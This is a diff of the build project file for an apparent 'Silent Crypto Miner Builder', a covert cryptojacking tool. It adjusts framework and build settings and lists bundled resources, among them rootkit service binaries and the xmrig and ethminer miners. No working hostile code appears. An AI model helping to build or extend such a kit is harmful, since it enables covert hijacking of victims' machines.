@@ -11,10 +11,12 @@
     <AssemblyName>Silent Crypto Miner Builder</AssemblyName>
     <FileAlignment>512</FileAlignment>
     <MyType>WindowsForms</MyType>
-    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <IsWebBootstrapper>false</IsWebBootstrapper>
     <TargetFrameworkProfile>
     </TargetFrameworkProfile>
+    <DefaultItemExcludes>$(DefaultItemExcludes);$(ProjectDir)**\*.vb</DefaultItemExcludes>
+    <LangVersion>latest</LangVersion>
     <PublishUrl>publish\</PublishUrl>
     <Install>true</Install>
     <InstallFrom>Disk</InstallFrom>
@@ -29,8 +31,6 @@
     <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
     <UseApplicationTrust>false</UseApplicationTrust>
     <BootstrapperEnabled>true</BootstrapperEnabled>
-    <DefaultItemExcludes>$(DefaultItemExcludes);$(ProjectDir)**\*.vb</DefaultItemExcludes>
-    <LangVersion>latest</LangVersion>
   </PropertyGroup>
   <PropertyGroup>
     <OptionExplicit>On</OptionExplicit>
@@ -68,6 +68,7 @@
     <PlatformTarget>x64</PlatformTarget>
     <LangVersion>latest</LangVersion>
   </PropertyGroup>
+  <PropertyGroup />
   <ItemGroup>
     <Reference Include="Microsoft.CSharp" />
     <Reference Include="Microsoft.VisualBasic" />
@@ -137,12 +138,9 @@
       <DesignTime>True</DesignTime>
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
-    <None Include="Resources\TaskTemplate.xml" />
-    <None Include="Resources\Miners\putty.exe" />
     <None Include="app.config" />
     <None Include="Resources\Rootkit\Uninstall64.exe" />
     <None Include="Resources\Rootkit\Service64.exe" />
-    <None Include="Resources\Miners\ddb64.dll" />
     <None Include="Resources\Miners\xmrig.exe" />
     <None Include="Resources\Miners\ethminer.exe" />
     <None Include="Resources\Code\Checker.cs" />
@@ -157,10 +155,6 @@
     <Content Include="Resources\LocalizedControls.xml" />
     <None Include="Resources\Compilers\resource.rcf" />
     <None Include="Resources\Compilers\template.manifest-miner" />
-    <None Include="Program\app.config" />
-    <None Include="Program\app.manifest">
-      <SubType>Designer</SubType>
-    </None>
     <None Include="Resources\Compilers\Compilers.zip" />
     <Compile Include="Classes\Theme.cs" />
   </ItemGroup>
